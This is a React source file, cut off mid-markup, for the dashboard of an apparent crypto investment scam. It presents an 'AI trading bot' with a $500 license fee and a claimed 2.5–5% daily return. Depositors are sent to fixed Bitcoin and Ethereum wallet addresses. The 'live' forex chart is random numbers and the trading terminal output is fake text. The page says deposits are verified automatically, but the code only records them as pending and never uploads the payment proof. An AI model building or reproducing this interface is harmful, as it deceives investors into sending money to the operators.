import { useState, useEffect, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import { supabase } from '../lib/supabase';
import { motion } from 'framer-motion';
import {
  Wallet, TrendingUp, ArrowDownCircle, ArrowUpCircle,
  Copy, Clock, CheckCircle, XCircle, DollarSign, BarChart3,
  Bot, Power, Activity, UploadCloud, FileCheck2, Cpu, ArrowRightLeft
} from 'lucide-react';
import { AreaChart, Area, ResponsiveContainer, YAxis } from 'recharts';
import toast from 'react-hot-toast';

interface Profile {
  full_name: string;
  balance: number;
  total_deposited: number;
  total_withdrawn: number;
  total_profit: number;
  role: string;
}

interface Transaction {
  id: string;
  type: string;
  amount: number;
  status: string;
  created_at: string;
  currency?: string;
}

// Generate realistic looking trading data
const generateTradingData = (points = 50) => {
  let base = 1.0800; // EUR/USD start
  return Array.from({ length: points }).map((_, i) => {
    base = base + (Math.random() - 0.48) * 0.002;
    return { time: i, value: base };
  });
};

export default function Dashboard() {
  const { user, loading: authLoading, isAdmin } = useAuth();
  const navigate = useNavigate();
  const [profile, setProfile] = useState<Profile | null>(null);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [activeTab, setActiveTab] = useState<'overview' | 'bot' | 'deposit' | 'withdraw'>('overview');
  
  // Deposit States
  const [depositAmount, setDepositAmount] = useState('');
  const [selectedCrypto, setSelectedCrypto] = useState('BTC');
  const [proofFile, setProofFile] = useState<File | null>(null);

  // Withdraw States
  const [withdrawAmount, setWithdrawAmount] = useState('');

  // Bot States
  const [botOwned, setBotOwned] = useState(false);
  const [botActive, setBotActive] = useState(false);
  const [botCapital, setBotCapital] = useState(0);
  const [botTransferAmount, setBotTransferAmount] = useState('');
  const [botTransferDirection, setBotTransferDirection] = useState<'in' | 'out'>('in'); // in = invest, out = swap back to portfolio

  const [loading, setLoading] = useState(true);
  
  // Chart Data
  const chartData = useMemo(() => generateTradingData(), []);

  const WALLET_ADDRESSES: Record<string, string> = {
    BTC: 'bc1qsnx0faedv2s80zdj3730dywhggjrrx7t5l0g86',
    ETH: '0x3ecED1d7b461d201ae87Ea609E59d3539D11D413',
  };

  useEffect(() => {
    if (!authLoading && !user) {
      navigate('/login');
      return;
    }
    if (user) {
      fetchData();
    }
  }, [user, authLoading]);

  async function fetchData() {
    try {
      // Fetch Profile
      const { data: profileData } = await supabase
        .from('profiles')
        .select('*')
        .eq('id', user!.id)
        .single();
      
      if (profileData) {
        setProfile(profileData);
      }

      // Fetch Transactions
      const { data: txData } = await supabase
        .from('transactions')
        .select('*')
        .eq('user_id', user!.id)
        .order('created_at', { ascending: false });

      if (txData) {
        setTransactions(txData.slice(0, 30));
        
        // Analyze Bot State from tx
        const hasBoughtBot = txData.some(tx => tx.type === 'bot_purchase' && tx.status === 'completed');
        setBotOwned(hasBoughtBot);

        const botInvestments = txData.filter(tx => tx.type === 'bot_investment' && tx.status === 'completed');
        const botWithdrawals = txData.filter(tx => tx.type === 'bot_withdrawal' && tx.status === 'completed');
        
        const totalIn = botInvestments.reduce((acc, tx) => acc + tx.amount, 0);
        const totalOut = botWithdrawals.reduce((acc, tx) => acc + tx.amount, 0);
        
        const currentBotCapital = totalIn - totalOut;
        setBotCapital(Math.max(0, currentBotCapital));
        setBotActive(currentBotCapital > 0);
      }
    } catch {
      // Fallback
      if (!profile) {
        setProfile({
          full_name: user?.user_metadata?.full_name || 'Investor',
          balance: 0,
          total_deposited: 0,
          total_withdrawn: 0,
          total_profit: 0,
          role: 'user',
        });
      }
    }
    setLoading(false);
  }

  const handleDeposit = async () => {
    if (!depositAmount || parseFloat(depositAmount) <= 0) {
      toast.error('Enter a valid deposit amount');
      return;
    }
    if (!proofFile) {
      toast.error('Please upload your proof of payment receipt.');
      return;
    }
    try {
      await supabase.from('transactions').insert({
        user_id: user!.id,
        type: 'deposit',
        amount: parseFloat(depositAmount),
        status: 'pending',
        currency: selectedCrypto,
      });
      toast.success('Deposit request submitted! Awaiting administrator verification.');
      setDepositAmount('');
      setProofFile(null);
      fetchData();
    } catch {
      toast.error('Failed to submit deposit');
    }
  };

  const handleWithdraw = async () => {
    if (!withdrawAmount || parseFloat(withdrawAmount) <= 0) {
      toast.error('Enter a valid withdrawal amount');
      return;
    }
    if (profile && parseFloat(withdrawAmount) > profile.balance) {
      toast.error('Insufficient available portfolio balance');
      return;
    }
    try {
      await supabase.from('transactions').insert({
        user_id: user!.id,
        type: 'withdrawal',
        amount: parseFloat(withdrawAmount),
        status: 'pending',
      });
      
      // Speculative local update
      if (profile) setProfile({...profile, balance: profile.balance - parseFloat(withdrawAmount)});
      
      toast.success('Withdrawal request submitted! Processing within 24 hours.');
      setWithdrawAmount('');
      fetchData();
    } catch {
      toast.error('Failed to submit withdrawal');
    }
  };

  const handleBuyBot = async () => {
    if (profile && profile.balance < 500) {
      toast.error('Insufficient portfolio balance to purchase the AI Trading Bot. Cost is $500.');
      return;
    }
    try {
      await supabase.from('transactions').insert({
        user_id: user!.id,
        type: 'bot_purchase',
        amount: 500,
        status: 'completed',
        currency: 'USD',
      });
      // Speculative update
      if (profile) setProfile({...profile, balance: profile.balance - 500});
      setBotOwned(true);
      toast.success('AI Trading Bot Successfully Purchased! System Initialized.');
    } catch {
      toast.error('Transaction Failed. Please contact support.');
    }
  };

  const handleBotTransfer = async () => {
    const amount = parseFloat(botTransferAmount);
    if (!amount || amount <= 0) {
      toast.error('Enter a valid transfer amount.');
      return;
    }

    if (botTransferDirection === 'in') {
      // Direct Crypto Deposit -> Bot
      if (!proofFile) {
        toast.error('Please upload proof of payment to activate bot.');
        return;
      }
      if (amount < 500 || amount > 50000) {
        toast.error('Bot injection amount must be between $500 and $50,000.');
        return;
      }

      try {
        await supabase.from('transactions').insert({
          user_id: user!.id,
          type: 'bot_investment',
          amount: amount,
          status: 'completed', // Immediately activates bot UI upon payment confirmation upload
          currency: selectedCrypto,
        });
        
        setBotCapital(prev => prev + amount);
        setBotActive(true);
        setBotTransferAmount('');
        setProofFile(null); // Reset file
        toast.success(`Payment Confirmed! Initializing algorithms with $${amount.toLocaleString()} capital.`);
      } catch {
        toast.error('Initialization failed.');
      }
    } else {
      // Bot -> Portfolio
      if (amount > botCapital) {
        toast.error('Insufficient capital in the Bot Terminal.');
        return;
      }

      try {
        await supabase.from('transactions').insert({
          user_id: user!.id,
          type: 'bot_withdrawal',
          amount: amount,
          status: 'completed',
          currency: 'USD',
        });
        
        if (profile) setProfile({...profile, balance: profile.balance + amount});
        setBotCapital(prev => {
          const newCap = prev - amount;
          if (newCap <= 0) setBotActive(false);
          return newCap;
        });
        setBotTransferAmount('');
        toast.success(`Successfully swapped $${amount.toLocaleString()} back to Main Portfolio.`);
      } catch {
        toast.error('Swap failed.');
      }
    }
  };

  const handleStopBot = () => {
    toast.success('Bot operations suspended. Positions closing...');
    setBotActive(false);
  };

  const copyAddress = (addr: string) => {
    navigator.clipboard.writeText(addr);
    toast.success('Wallet address copied to clipboard!');
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      setProofFile(e.target.files[0]);
    }
  };

  if (authLoading || loading) {
    return (
      <div className="min-h-screen bg-[#070b14] flex items-center justify-center">
        <div className="relative w-16 h-16">
          <div className="absolute inset-0 rounded-full border-t-2 border-emerald-500 animate-spin" />
          <div className="absolute inset-2 rounded-full border-t-2 border-slate-500 animate-spin animation-delay-150" />
        </div>
      </div>
    );
  }

  const stats = [
    { icon: Wallet, label: 'Portfolio Balance', value: `$${(profile?.balance ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}`, color: 'text-emerald-400' },
    { icon: Cpu, label: 'Active Bot Capital', value: `$${botCapital.toLocaleString('en-US', { minimumFractionDigits: 2 })}`, color: 'text-indigo-400' },
    { icon: TrendingUp, label: 'Total Profit', value: `$${(profile?.total_profit ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}`, color: 'text-green-400' },
    { icon: ArrowUpCircle, label: 'Total Withdrawn', value: `$${(profile?.total_withdrawn ?? 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}`, color: 'text-amber-400' },
  ];

  return (
    <div className="min-h-screen bg-[#070b14] text-slate-200">
      
      {/* Background ambient light */}
      <div className="fixed top-0 left-0 w-full h-[500px] bg-gradient-to-b from-emerald-900/10 to-transparent pointer-events-none" />

      <div className="max-w-[1400px] mx-auto px-4 py-8 relative z-10">
        {/* Header */}
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between mb-10 pb-6 border-b border-slate-800/80">
          <div>
            <h1 className="text-3xl font-bold font-serif text-white drop-shadow-sm">
              Welcome, <span className="text-emerald-400">{profile?.full_name || 'Investor'}</span>
            </h1>
            <p className="text-slate-400 mt-1.5 font-medium tracking-wide text-sm">INSTITUTIONAL ASSET MANAGEMENT & ALGORITHMIC PLATFORM</p>
          </div>
          {isAdmin && (
            <span className="mt-4 md:mt-0 px-4 py-1.5 bg-amber-500/10 border border-amber-500/20 text-amber-400 rounded-full text-xs font-bold tracking-widest uppercase shadow-[0_0_10px_rgba(245,158,11,0.2)]">
              Admin Portal
            </span>
          )}
        </div>

        {/* Dynamic Stats Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5 mb-10">
          {stats.map((stat, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: i * 0.1 }}
              className="p-6 rounded-2xl bg-gradient-to-br from-slate-800/70 to-slate-900/80 border border-slate-700/50 shadow-xl shadow-black/40 backdrop-blur-md relative overflow-hidden"
            >
              <div className={`absolute top-0 right-0 w-32 h-32 ${stat.color.replace('text-', 'bg-')} opacity-[0.03] rounded-full blur-2xl -mr-10 -mt-10`} />
              
              <div className="flex items-center gap-4 mb-4 relative z-10">
                <div className={`p-3 rounded-xl bg-slate-900 border border-slate-800 shadow-inner ${stat.color}`}>
                  <stat.icon size={22} />
                </div>
                <span className="text-slate-400 text-xs font-bold uppercase tracking-wider">{stat.label}</span>
              </div>
              <div className="text-3xl font-black text-white px-1 tracking-tight drop-shadow-sm relative z-10">{stat.value}</div>
            </motion.div>
          ))}
        </div>

        {/* Navigation Tabs */}
        <div className="flex flex-wrap gap-2 mb-10 bg-slate-900 p-2 rounded-2xl border border-slate-800/80 shadow-inner w-full max-w-[700px]">
          {(['overview', 'bot', 'deposit', 'withdraw'] as const).map(tab => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`flex-1 min-w-[120px] py-3 px-4 rounded-xl text-sm font-bold tracking-wide transition-all duration-300
                ${activeTab === tab 
                  ? 'bg-emerald-500 text-white shadow-lg shadow-emerald-500/25 border border-emerald-400/50' 
                  : 'text-slate-400 hover:text-white hover:bg-slate-800 border border-transparent'}`}
            >
              {tab === 'overview' ? 'Main Portfolio' : tab === 'bot' ? 'GF Bot Terminal' : tab === 'deposit' ? 'Add Funds' : 'Withdraw'}
            </button>
          ))}
        </div>

        {/* TAB: Bot Terminal */}
        {activeTab === 'bot' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="grid grid-cols-1 lg:grid-cols-12 gap-8">
            {/* Left Column: Controls */}
            <div className="lg:col-span-5 flex flex-col gap-6">
              
              {/* Status Header Block */}
              <div className="bg-gradient-to-b from-slate-800/80 to-slate-900 border border-slate-700/60 rounded-3xl p-6 relative overflow-hidden backdrop-blur-xl shadow-2xl">
                {botActive && (
                  <div className="absolute inset-0 bg-emerald-500/5 animate-pulse pointer-events-none" />
                )}
                
                <div className="flex items-center justify-between mb-8 relative z-10">
                  <div className="flex items-center gap-4">
                    <div className={`p-4 rounded-2xl ${botActive ? 'bg-emerald-500 text-white shadow-[0_0_20px_rgba(16,185,129,0.4)]' : 'bg-slate-800 text-slate-400 border border-slate-700'} transition-all duration-500`}>
                      <Bot size={32} />
                    </div>
                    <div>
                      <h2 className="text-2xl font-black text-white tracking-tight uppercase">QuantTrader<span className="text-emerald-400">Pro</span></h2>
                      <div className="flex items-center gap-2 mt-1.5">
                        <span className="relative flex h-2 w-2">
                          {botActive && <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>}
                          <span className={`relative inline-flex rounded-full h-2 w-2 ${botActive ? 'bg-emerald-500' : 'bg-slate-600'}`}></span>
                        </span>
                        <span className={`text-xs font-bold uppercase tracking-wider ${botActive ? 'text-emerald-400' : 'text-slate-500'}`}>
                          {botActive ? 'HFT Subsystem Online' : 'System Idle - Awaiting Capital'}
                        </span>
                      </div>
                    </div>
                  </div>
                  {botOwned && botActive && (
                     <button onClick={handleStopBot} className="p-3 bg-red-500/10 hover:bg-red-500/20 text-red-500 border border-red-500/20 rounded-xl transition-all" title="Halt Bot">
                       <Power size={20} />
                     </button>
                  )}
                </div>

                {!botOwned ? (
                  <div className="border border-indigo-500/30 bg-indigo-500/5 rounded-2xl p-6 text-center">
                    <h3 className="text-xl font-bold text-white mb-2">Automated Forex Ecosystem</h3>
                    <p className="text-slate-400 text-sm mb-6 leading-relaxed">
                      Deploy capital into our proprietary High-Frequency Trading algorithm. Executes micro-second trades across major fiat pairs 24/5. Subject to $500 one-time bot license.
                    </p>
                    <button
                      onClick={handleBuyBot}
                      className="w-full py-4 bg-indigo-500 text-white rounded-xl font-bold uppercase tracking-widest hover:bg-indigo-600 transition shadow-[0_0_20px_rgba(99,102,241,0.3)]"
                    >
                      Purchase License ($500)
                    </button>
                  </div>
                ) : (
                  <div className="bg-[#0a0f1a] rounded-2xl p-5 border border-slate-700/50 shadow-inner">
                    <div className="flex items-end justify-between mb-6">
                      <div>
                        <p className="text-xs font-bold text-slate-500 uppercase tracking-widest mb-1.5">Live Deployed Capital</p>
                        <p className="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">
                          ${botCapital.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                        </p>
                      </div>
                      <div className="text-right">
                        <p className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Est. Daily ROI</p>
                        <p className="text-lg font-bold text-white shadow-sm flex items-center justify-end gap-1">
                          <TrendingUp size={16} className="text-emerald-400" /> 2.5% ~ 5.0%
                        </p>
                      </div>
                    </div>

                    <div className="bg-slate-800 rounded-xl p-1 flex mb-4">
                      <button 
                        onClick={() => setBotTransferDirection('in')}
                        className={`flex-1 py-2 text-xs font-bold uppercase rounded-lg transition-all ${botTransferDirection === 'in' ? 'bg-emerald-500 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}
                      >
                        Inject Capital
                      </button>
                      <button 
                        onClick={() => setBotTransferDirection('out')}
                        className={`flex-1 py-2 text-xs font-bold uppercase rounded-lg transition-all ${botTransferDirection === 'out' ? 'bg-slate-700 text-white shadow-md' : 'text-slate-400 hover:text-white'}`}
                      >
                        Swap to Portfolio
                      </button>
                    </div>

                    {botTransferDirection === 'in' ? (
                      <div className="space-y-4">
                        <div className="flex gap-2">
                          <button onClick={() => setSelectedCrypto('BTC')} className={`flex-1 py-2.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all shadow-md ${selectedCrypto === 'BTC' ? 'bg-amber-500 text-slate-900' : 'bg-[#0f172a] border border-slate-700 text-slate-400 hover:border-amber-500/50'}`}>Bitcoin</button>
                          <button onClick={() => setSelectedCrypto('ETH')} className={`flex-1 py-2.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all shadow-md ${selectedCrypto === 'ETH' ? 'bg-slate-200 text-slate-900 border border-slate-200' : 'bg-[#0f172a] border border-slate-700 text-slate-400 hover:border-slate-400/50'}`}>Ethereum</button>
                        </div>
                        
                        <div className="flex items-center gap-4 bg-slate-900/80 p-3 rounded-xl border border-slate-700 shadow-inner">
                          <img src={`https://api.qrserver.com/v1/create-qr-code/?size=80x80&data=${WALLET_ADDRESSES[selectedCrypto]}&margin=0`} alt="QR Code" className="w-[80px] h-[80px] rounded-lg bg-white p-1" />
                          <div className="flex-1 min-w-0">
                            <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-1.5 flex items-center justify-between">Transfer Address {selectedCrypto === 'BTC' ? '₿' : '⟠'}</p>
                            <div className="relative">
                              <code className="block text-xs font-mono text-emerald-400 truncate max-w-[130px] pr-8">{WALLET_ADDRESSES[selectedCrypto]}</code>
                              <button onClick={() => copyAddress(WALLET_ADDRESSES[selectedCrypto])} className="absolute right-0 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white transition"><Copy size={16}/></button>
                            </div>
                          </div>
                        </div>

                        <div className="relative">
                          <DollarSign size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                          <input type="number" value={botTransferAmount} onChange={(e) => setBotTransferAmount(e.target.value)} placeholder="Deposit Amount (Min $500)" className="w-full pl-9 pr-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white font-bold outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/50 transition-all text-sm placeholder-slate-600 shadow-inner" />
                        </div>

                        <div className="relative border border-dashed border-slate-600 rounded-xl p-3.5 bg-slate-900/50 text-center hover:border-emerald-500/50 transition-all group overflow-hidden">
                           <input type="file" onChange={handleFileChange} className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10" accept="image/*,.pdf" />
                           {!proofFile ? (
                             <p className="text-[11px] font-bold uppercase tracking-wider text-slate-400 flex items-center justify-center gap-2 group-hover:text-emerald-400 transition-colors"><UploadCloud size={16}/> Upload Proof of Payment</p>
                           ) : (
                             <p className="text-[11px] font-bold text-emerald-400 truncate px-2 flex items-center justify-center gap-2"><FileCheck2 size={16}/> {proofFile.name}</p>
                           )}
                        </div>

                        <button onClick={handleBotTransfer} className="w-full py-4 bg-emerald-500 hover:bg-emerald-400 text-white rounded-xl font-bold text-xs uppercase tracking-widest shadow-[0_0_20px_rgba(16,185,129,0.2)] transition-all">
                           Confirm Payment & Start Bot
                        </button>
                      </div>
                    ) : (
                      <div className="flex gap-2">
                         <div className="relative flex-1">
                           <DollarSign size={16} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                           <input
                             type="number"
                             value={botTransferAmount}
                             onChange={(e) => setBotTransferAmount(e.target.value)}
                             placeholder="Amount to swap"
                             className="w-full pl-9 pr-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white font-bold outline-none focus:border-amber-500/50 focus:ring-1 focus:ring-amber-500/50 transition-all placeholder-slate-600 shadow-inner"
                           />
                         </div>
                         <button
                           onClick={handleBotTransfer}
                           className="px-5 py-3 rounded-xl font-bold flex items-center justify-center transition-all bg-slate-800 hover:bg-amber-500 hover:text-slate-900 text-amber-500 border border-amber-500/30"
                         >
                           <ArrowRightLeft size={20} />
                         </button>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>

            {/* Right Column: Chart / Analytics */}
            <div className="lg:col-span-7">
              <div className="bg-slate-900 border border-slate-800 rounded-3xl h-full flex flex-col overflow-hidden shadow-2xl relative">
                {/* Simulated Terminal Header */}
                <div className="bg-slate-800/50 border-b border-slate-800 p-4 flex items-center justify-between">
                  <div className="flex items-center gap-4">
                    <span className="text-xs font-bold text-slate-400 uppercase tracking-widest focus:outline-none">EUR/USD <span className="text-emerald-400 ml-1">+0.015%</span></span>
                    <span className="text-xs font-bold text-slate-400 uppercase tracking-widest opacity-50">GBP/JPY <span className="text-rose-400 ml-1">-0.004%</span></span>
                  </div>
                  <div className="flex gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-rose-500"></span>
                    <span className="w-2.5 h-2.5 rounded-full bg-amber-500"></span>
                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-500"></span>
                  </div>
                </div>

                <div className="flex-1 p-6 flex flex-col relative">
                  {!botActive && (
                     <div className="absolute inset-0 z-20 backdrop-blur-sm bg-[#070b14]/50 flex flex-col items-center justify-center">
                        <LockIndicator />
                        <h3 className="text-white font-bold text-lg mt-4">Terminal Locked</h3>
                        <p className="text-slate-400 text-sm mt-1">Deploy capital to initiate algorithmic data feed.</p>
                     </div>
                  )}

                  <div className="flex justify-between items-end mb-6 relative z-10">
                    <div>
                      <p className="text-slate-400 text-xs font-bold uppercase tracking-widest mb-1">Current Exchange Vector</p>
                      <h3 className="text-5xl font-black text-white tracking-tighter">1.08<span className="text-slate-400">42</span></h3>
                    </div>
                    <div className="text-right">
                      <p className="text-emerald-400 text-sm font-bold flex items-center justify-end gap-1"><ArrowUpCircle size={14}/> Volatility Mod: Stable</p>
                    </div>
                  </div>

                  <div className="flex-1 w-full relative z-10 min-h-[300px]">
                    <ResponsiveContainer width="100%" height="100%">
                      <AreaChart data={chartData}>
                        <defs>
                          <linearGradient id="colorValue" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="5%" stopColor="#10b981" stopOpacity={0.3}/>
                            <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                          </linearGradient>
                        </defs>
                        <YAxis domain={['auto', 'auto']} hide />
                        <Area type="monotone" dataKey="value" stroke="#10b981" strokeWidth={3} fillOpacity={1} fill="url(#colorValue)" isAnimationActive={botActive} />
                      </AreaChart>
                    </ResponsiveContainer>
                  </div>
                  
                  {/* Faux Terminal Output */}
                  <div className="mt-4 pt-4 border-t border-slate-800 font-mono text-[10px] text-emerald-500/70 h-24 overflow-hidden relative z-10 flex flex-col justify-end">
                    {botActive ? (
                      <>
                        <p>{'>'} [SYS] CONNECTED TO GLOBAL LIQUIDITY POOLS...</p>
                        <p>{'>'} [ALGO] SCANNING ARBITRAGE OPPORTUNITIES...</p>
                        <p>{'>'} [EXEC] DEPLOYING FRAGMENTED BUY ORDERS @ EUR/USD...</p>
                        <p className="text-white">{'>'} [STATUS] RUNNING NOMINAL.</p>
                      </>
                    ) : (
                      <>
                        <p>{'>'} AWAITING USER AUTHENTICATION...</p>
                        <p>{'>'} SYSTEM STANDBY.</p>
                      </>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {/* TAB: Main Portfolio */}
        {activeTab === 'overview' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <div className="bg-slate-800/40 border border-slate-700/60 rounded-3xl overflow-hidden shadow-2xl backdrop-blur-md">
              <div className="p-6 border-b border-slate-700/60 flex items-center justify-between bg-slate-800/20">
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-emerald-500/10 rounded-lg"><Clock size={20} className="text-emerald-400" /></div>
                  <h2 className="text-xl font-bold font-sans text-white">Recent Ledger Architecture</h2>
                </div>
              </div>
              {transactions.length === 0 ? (
                <div className="p-20 text-center">
                  <div className="w-20 h-20 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-6 shadow-inner border border-slate-700/50">
                    <BarChart3 size={32} className="opacity-30" />
                  </div>
                  <p className="font-bold text-lg text-white">No transactions recorded in the ledger.</p>
                  <p className="text-slate-400 mt-2">Visit the Add Funds tab to inject capital into your portfolio.</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="bg-slate-900/40 border-b border-slate-800 text-[10px] uppercase tracking-[0.2em] text-slate-500">
                        <th className="p-5 font-bold">Transaction Type</th>
                        <th className="p-5 font-bold">Timestamp</th>
                        <th className="p-5 font-bold">Capital Value</th>
                        <th className="p-5 font-bold text-right">Status Code</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 text-sm">
                      {transactions.map(tx => (
                        <tr key={tx.id} className="hover:bg-slate-800/30 transition-colors group">
                          <td className="p-5">
                            <div className="flex items-center gap-4">
                              <div className="p-2.5 bg-slate-900 rounded-xl border border-slate-800 shadow-inner group-hover:border-emerald-500/30 transition">
                                {tx.type === 'deposit' ? <ArrowDownCircle size={18} className="text-emerald-400" /> :
                                 tx.type === 'bot_purchase' || tx.type === 'bot_investment' || tx.type === 'bot_withdrawal' ? <Cpu size={18} className="text-indigo-400" /> :
                                 <ArrowUpCircle size={18} className="text-amber-400" />}
                              </div>
                              <span className="font-bold capitalize text-slate-200 tracking-wide">{tx.type.replace('_', ' ')}</span>
                            </div>
                          </td>
                          <td className="p-5 text-slate-400 font-medium">
                            {new Date(tx.created_at).toLocaleDateString()} <span className="text-xs ml-2 opacity-50">{new Date(tx.created_at).toLocaleTimeString()}</span>
                          </td>
                          <td className="p-5 font-black text-white text-lg tracking-tight">
                            ${tx.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                          </td>
                          <td className="p-5 text-right">
                            <span className={`inline-flex items-center px-4 py-1.5 rounded-full text-xs font-bold uppercase tracking-wider shadow-sm ${
                              ['approved', 'completed'].includes(tx.status)
                                ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
                                : tx.status === 'pending'
                                ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20'
                                : 'bg-red-500/10 text-red-500 border border-red-500/20'
                            }`}>
                              {['approved', 'completed'].includes(tx.status) ? <CheckCircle size={12} className="mr-2" /> :
                               tx.status === 'pending' ? <Clock size={12} className="mr-2" /> :
                               <XCircle size={12} className="mr-2" />}
                              {tx.status}
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </motion.div>
        )}

        {/* TAB: Add Funds */}
        {activeTab === 'deposit' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="grid grid-cols-1 lg:grid-cols-12 gap-8">
            <div className="lg:col-span-7">
              <div className="bg-slate-800/40 border border-slate-700/60 rounded-3xl p-8 backdrop-blur-md shadow-2xl">
                <h2 className="text-2xl font-black font-sans mb-8 flex items-center gap-3 text-white">
                  <div className="p-3 bg-emerald-500/10 rounded-xl"><ArrowDownCircle size={24} className="text-emerald-400" /></div>
                  Secure Deposit Gateway
                </h2>

                <div className="mb-8">
                  <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">1. Select Blockchain Environment</label>
                  <div className="flex gap-4">
                    {Object.keys(WALLET_ADDRESSES).map(c => (
                      <button
                        key={c}
                        onClick={() => setSelectedCrypto(c)}
                        className={`flex-1 py-4 px-6 rounded-2xl text-sm font-bold tracking-wide transition-all border shadow-lg flex items-center justify-center gap-3
                          ${selectedCrypto === c 
                            ? 'bg-gradient-to-t from-emerald-600 to-emerald-500 border-emerald-400 text-white shadow-emerald-500/20 scale-105' 
                            : 'bg-slate-900 border-slate-700 text-slate-400 hover:border-emerald-500/50'}`}
                      >
                        {c === 'BTC' ? <span className="text-lg">₿</span> : <span className="text-lg">⟠</span>} {c} Network
                      </button>
                    ))}
                  </div>
                </div>

                <div className="mb-8 p-8 bg-slate-900 rounded-3xl border border-slate-800 shadow-inner flex flex-col md:flex-row items-center gap-8 relative overflow-hidden">
                  {/* Decorative background light */}
                  <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-emerald-500/10 blur-3xl rounded-full" />
                  
                  <div className="bg-white p-3 rounded-2xl flex-shrink-0 shadow-[0_0_20px_rgba(255,255,255,0.1)] relative z-10 z-20">
                    <img 
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${WALLET_ADDRESSES[selectedCrypto]}&margin=0`} 
                      alt="Deposit QR" 
                      className="w-[160px] h-[160px] object-contain"
                    />
                  </div>
                  <div className="flex-1 w-full text-center md:text-left relative z-10">
                    <h3 className="text-sm font-black text-white uppercase tracking-wider mb-1">Official Routing Address</h3>
                    <p className="text-xs text-slate-500 mb-4 leading-relaxed max-w-[280px]">Transfer your {selectedCrypto} precisely to the address below. Funds will be verified automatically.</p>
                    <div className="relative">
                      <code className="block w-full bg-[#0a0f1a] border border-slate-700 p-4 pr-14 rounded-xl text-[11px] text-emerald-400 font-mono break-all border-dashed">
                        {WALLET_ADDRESSES[selectedCrypto]}
                      </code>
                      <button 
                        onClick={() => copyAddress(WALLET_ADDRESSES[selectedCrypto])} 
                        className="absolute right-2 top-1/2 -translate-y-1/2 p-2 bg-emerald-500/10 hover:bg-emerald-500 text-emerald-400 hover:text-white rounded-lg transition-all"
                        title="Copy to clipboard"
                      >
                        <Copy size={18} />
                      </button>
                    </div>
                  </div>
                </div>

                <div className="mb-8">
                  <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">2. Injection Parameters</label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-5 flex items-center pointer-events-none">
                      <span className="text-slate-400 font-bold">$</span>
                    </div>
                    <input
                      type="number"
                      value={depositAmount}
                      onChange={e => setDepositAmount(e.target.value)}
                      placeholder="Amount in USD"
                      min="100"
                      className="w-full pl-10 pr-6 py-4 bg-slate-900 border border-slate-700 rounded-2xl text-xl text-white font-black placeholder-slate-700 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition-all shadow-inner"
                    />
                  </div>
                </div>

                <div className="mb-10">
                  <label className="block text-xs font-bold text-slate-500 uppercase tracking-widest mb-4">3. Security Verification</label>
                  <div className="relative border-2 border-dashed border-slate-700 hover:border-emerald-500/50 rounded-3xl p-8 bg-slate-900/50 transition-all text-center overflow-hidden group">
                    <div className="absolute inset-0 bg-emerald-500/0 group-hover:bg-emerald-500/5 transition-colors" />
                    <input 
                      type="file" 
                      onChange={handleFileChange}
                      className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      accept="image/*,.pdf"
                    />
                    {!proofFile ? (
                      <div className="pointer-events-none relative z-0">
                        <div className="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mx-auto mb-4 group-hover:scale-110 transition-transform">
                          <UploadCloud size={28} className="text-emerald-400" />
                        </div>
                        <p className="text-sm font-bold text-white tracking-wide">Attach Deposit Receipt</p>
                        <p className="text-xs text-slate-500 mt-2 font-semibold tracking-wide">JPG, PNG, PDF SUPPORTED</p>
